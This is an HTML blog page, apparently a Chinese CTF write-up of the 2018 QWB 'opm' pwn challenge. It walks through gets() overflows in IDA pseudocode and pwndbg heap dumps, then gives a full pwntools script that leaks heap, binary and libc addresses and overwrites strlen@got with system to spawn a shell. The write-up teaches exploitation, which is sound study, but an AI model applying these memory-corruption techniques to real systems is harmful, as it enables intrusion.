@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        qwb-pwn-opm · kir[A]&#39;s 小黑屋
+        
+    </title>
+    <link rel="icon" href= /assets/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >kir[A]&#39;s 小黑屋.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">qwb-pwn-opm</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>kir[A]'s 小黑屋.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            qwb-pwn-opm
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = pwn>pwn</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/12</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h3><p>首先学习一下在IDA创建结构体，<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">https://blog.csdn.net/hgy413/article/details/7104304</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 length          dq ?</span><br><span class="line">00000018 punch_num       dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure>
+<p>按y重新设置类型后，add_role()伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">role *<span class="title">add_role</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  role *v0; <span class="comment">// rbx</span></span><br><span class="line">  role *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  role *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1A0h]</span></span><br><span class="line">  role *v6; <span class="comment">// [rsp+80h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+100h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+188h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = (role *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  sub_56544D04DE2C((__int64)v0);                <span class="comment">// 初始化结构体</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v0-&gt;func = (__int64)show;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v1 = v6;</span><br><span class="line">  v1-&gt;length = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, &amp;s);</span><br><span class="line">  v6-&gt;name = (__int64)v7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"N punch?"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v3 = v6;</span><br><span class="line">  LODWORD(v3-&gt;punch_num) = atoi(&amp;s);</span><br><span class="line">  show((__int64)v6);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>思路：gets可以覆盖v6（注意gets会在末位加上’\x00’），第一个溢出点可以改变结构体存放的地址，第二溢出点可以用于泄露地址。</p>
+<p><strong>具体利用过程</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)  <span class="comment">#padding</span></span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">"\x10"</span>,<span class="number">2</span>) <span class="comment">#role1</span></span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>) <span class="comment">#role2</span></span><br></pre></td></tr></table></figure>
+<p>程序在heap上会有个很大的chunk，所以覆盖v6的最低位，或者倒数第二为\x00，指针仍然在heap上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5603fb8e5000</span><br><span class="line">0x5603fb8e5000:	0x0000000000000000	0x0000000000011c11</span><br><span class="line">0x5603fb8e5010:	0x0000000000011c00	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>首先正常创建一个role0（用来调整堆的位置，让role1-&gt;name在可控范围范围内）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x55877d5ee000+0x11c10</span><br><span class="line">0x55877d5ffc10:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55877d5ffc20:	0x000055877c368b30-&gt;func	0x000055877d5ffc50-&gt;name</span><br><span class="line">0x55877d5ffc30:	0x0000000000000070-&gt;len 	0x0000000000000001-&gt;punch</span><br><span class="line">0x55877d5ffc40:	0x0000000000000000	0x0000000000000081</span><br><span class="line">0x55877d5ffc50:	0x4141414141414141	0x4141414141414141-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffc60:	0x4141414141414141	0x4141414141414141</span><br></pre></td></tr></table></figure></p>
+<p>然后创建一个role1，输入name的时候v6被覆盖成<code>xxxx0010</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x55877c56a0e0</span><br><span class="line">0x55877c56a0e0:	0x000055877d5ffc20-&gt;role0	0x000055877d5f0010-&gt;role1</span><br><span class="line">0x55877c56a0f0:	0x000055877d5f0010-&gt;role2	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>由于v6被覆盖，只有func存到正确位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffcc0:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x55877d5ffcd0:	0x000055877c368b30-&gt;func	0x0000000000000000</span><br><span class="line">0x55877d5ffce0:	0x0000000000000000	        0x0000000000000000</span><br><span class="line">0x55877d5ffcf0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55877d5ffd00:	0x4242424242424242	0x4242424242424242-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffd10:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure></p>
+<p>其余部分存放到<code>0x000055877d5f0010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x000055877d5f0010</span><br><span class="line">0x55877d5f0010:	0x0000000000000000	0x000055877d5ffd00-&gt;name</span><br><span class="line">0x55877d5f0020:	0x0000000000000081	0x0000000000000003</span><br></pre></td></tr></table></figure></p>
+<p>创建一个role2，第一次溢出覆盖v6最低位为<code>xxxxxx00</code>，本来应为<code>0x55877d5ffd90</code>，变成了<code>0x55877d5ffd00</code>，而这个地址是role1存放name的chunk。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd80:	0x0000000000000010	0x0000000000000031</span><br><span class="line">0x55877d5ffd90:	0x000055877c368b30	0x0000000000000000</span><br><span class="line">0x55877d5ffda0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55877d5ffdb0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55877d5ffdc0:	0x4343434343434343	0x4343434343434343-&gt;name</span><br><span class="line">0x55877d5ffdd0:	0x4343434343434343	0x4343434343434343</span><br></pre></td></tr></table></figure></p>
+<p>重新查看role1的heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd00:	0x4242424242424242	0x000055877d5ffdc0-&gt;role1的name地址</span><br><span class="line">0x55877d5ffd10:	0x0000000000000080	0x4242424242424242</span><br></pre></td></tr></table></figure></p>
+<p>第二次溢出覆盖v6最低位为<code>xxxx0010</code>，那么v6变成<code>0x000055877d5f0010</code>，这个地址是role1的地址，函数结束时候show就会把role1-&gt;name打印出来，此时role-&gt;name有heap的地址。</p>
+<p>有了heap地址，就可以伪造role泄露函数地址，<code>0x000055877d5ffdc0-0x30</code>就是role2-&gt;func的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(&apos;E&apos;*8+p64(heap-0x30),str(131441).ljust(0x80,&apos;F&apos;)+p64(heap+0xc0))</span><br></pre></td></tr></table></figure>
+<p>创建一个role3，利用role3-&gt;name进行伪造role，role3-&gt;name[0]当作func，role3-&gt;name[1]填入role2-&gt;func的地址<code>0x000055877d5ffdc0-0x30</code>，在第二个溢出点修改v6为fake role的地址<code>0x000055877d5ffdc0+0xc0</code>，由于punch num的输入会破坏top chunk，所以需要计算此时正确的数值，并输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来top chunk:0x201c1</span><br><span class="line">新建role3后申请了0x30+0x20的空间</span><br><span class="line">此时top chunk:0x201c1-0x50 = 0x20171 = 131441</span><br></pre></td></tr></table></figure></p>
+<p>完成role3创建后heap结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64gx 0x55877d5ffd80</span><br><span class="line">0x55877d5ffd80:	0x0000000000000010	0x0000000000000031 ----&gt;role2</span><br><span class="line">0x55877d5ffd90:	0x000055877c368b30	0x0000000000000000</span><br><span class="line">0x55877d5ffda0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55877d5ffdb0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55877d5ffdc0:	0x4343434343434343	0x4343434343434343 ----&gt;role2-&gt;name</span><br><span class="line">0x55877d5ffdd0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffde0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffdf0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffe00:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffe10:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffe20:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffe30:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x55877d5ffe40:	0x0000000000000000	0x0000000000000031 ----&gt;role3</span><br><span class="line">0x55877d5ffe50:	0x000055877c368b30	0x000055877d5ffe80</span><br><span class="line">0x55877d5ffe60:	0x000000000000000e	0x0000000000000000</span><br><span class="line">0x55877d5ffe70:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55877d5ffe80:	0x4545454545454545	0x000055877d5ffd90 ----&gt;role3-&gt;name # fake role</span><br><span class="line">0x55877d5ffe90:	0x0000000000000000	0x0000000000020171 ----&gt;top chunk</span><br></pre></td></tr></table></figure></p>
+<p>同理可以泄漏libc地址，然后利用第二个溢出点覆盖v6为strlen@got地址，通过写入punch num修改低8位地址为system地址或者onegadget地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,n)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'A'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">'punch?'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">'\x10'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">p.recvuntil(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(heap))</span><br><span class="line"><span class="comment"># leak elf base</span></span><br><span class="line">add(<span class="string">'E'</span>*<span class="number">8</span>+p64(heap<span class="number">-0x30</span>),str(<span class="number">131441</span>).ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">func = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">elf.address = func<span class="number">-0xb30</span></span><br><span class="line">success(hex(elf.address)) </span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(<span class="string">'G'</span>*<span class="number">8</span>+p64(elf.got[<span class="string">'strlen'</span>]),str(<span class="number">131441</span><span class="number">-0x30</span><span class="number">-0x20</span>).ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">strlen_addr = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = strlen_addr - libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">add(<span class="string">'I'</span>*<span class="number">0x10</span>,str(libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffffffff</span>).ljust(<span class="number">0x80</span>,<span class="string">'J'</span>)+p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>后来发现fake role向前移0x8就不会破坏top chunk，修改如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak elf addr</span></span><br><span class="line">add(p64(heap<span class="number">-0x30</span>),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span><span class="number">-0x8</span>))</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(p64(elf.got[<span class="string">'strlen'</span>]),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span><span class="number">-0x8</span>))</span><br></pre></td></tr></table></figure></p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2018/04/12/qwb-pwn-raisepig/" title= qwb-pwn-raisepig >
+                    <span>Previous Post</span>
+                    <span>qwb-pwn-raisepig</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:304822113@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/4f-kira" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#opm"><span class="toc-number">1.</span> <span class="toc-text">opm</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 6 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2018/04/12/qwb-pwn-raisepig/" >qwb-pwn-raisepig</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2018/04/12/qwb-pwn-opm/" >qwb-pwn-opm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/qwb-pwn-silent1&2/" >qwb-pwn-silent1&2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Hgame-pwn/" >Hgame pwn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href= "/2018/01/30/pwn-imdb/" >pwn-imdb</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/2018/01/16/hello-world/" >Hello World</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">pwn</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: false
+    tags: true</pre>
+    </div> 
